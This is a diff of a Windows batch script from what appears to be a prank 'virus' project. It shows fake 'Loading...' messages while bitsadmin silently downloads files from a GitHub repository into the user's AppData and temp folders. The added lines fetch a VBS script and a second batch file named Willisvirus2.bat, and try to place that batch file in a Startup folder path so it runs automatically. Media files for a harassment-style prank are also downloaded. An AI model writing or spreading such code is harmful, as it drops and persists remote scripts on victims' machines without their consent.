@@ -18,38 +18,43 @@ if not exist "%appdata%\willishot\cmdmenusel.exe" bitsadmin /transfer willishot.
 ping localhost -n 1 >nul
 cls
 echo Loading...
+if not exist "%appdata%\willishot\Messagebox.vbs" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Messagebox.vbs" "%appdata%\willishot\Messagebox.vbs" >nul
+if not exist "%temp%\Microsoft\Windows\Start Menu\Programs\Startup\Willisvirus2.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Willisvirus2.bat" "%temp%\Microsoft\Windows\Start Menu\Programs\Startup\Willisvirus2.bat" >nul
+ping localhost -n 1 >nul
+cls
+echo Loading.
 if not exist "%appdata%\willishot\wallpaper.png" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/wallpaper.png" "%appdata%\willishot\wallpaper.png" >nul
 ping localhost -n 1 >nul
 cls
-echo Loading.
+echo Loading..
 if not exist "%temp%\bruh.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Bruh_Sound_Effect.mp3" "%temp%\bruh.mp3" >nul
 ping localhost -n 1 >nul
 cls
-echo Loading..
+echo Loading...
 if not exist "%temp%\fnaf.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/fnaf.mp3" "%temp%\fnaf.mp3" >nul
 ping localhost -n 1 >nul
 cls
-echo Loading...
+echo Loading.
 if not exist "%temp%\vine.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/vine.mp3" "%temp%\vine.mp3" >nul
 ping localhost -n 1 >nul
 cls
-echo Loading.
+echo Loading..
 if not exist "%temp%\creepy.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/creepy.mp3" "%temp%\creepy.mp3" >nul
 ping localhost -n 1 >nul
 cls
-echo Loading..
+echo Loading...
 if not exist "%temp%\creepy2.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/creepy2.mp3" "%temp%\creepy2.mp3" >nul
 ping localhost -n 1 >nul
 cls
-echo Loading...
+echo Loading.
 if not exist "%temp%\goodjob.wav" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/goodjob.wav" "%temp%\goodjob.wav" >nul
 ping localhost -n 1 >nul
 cls
-echo Loading.
+echo Loading..
 if not exist "%temp%\areyousure.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/areyousure.mp3" "%temp%\areyousure.mp3" >nul
 ping localhost -n 1 >nul
 cls
-echo Loading..
+echo Loading...
 cls
 echo.
 echo Hey %USERNAME%, Is Will a big sexy man?
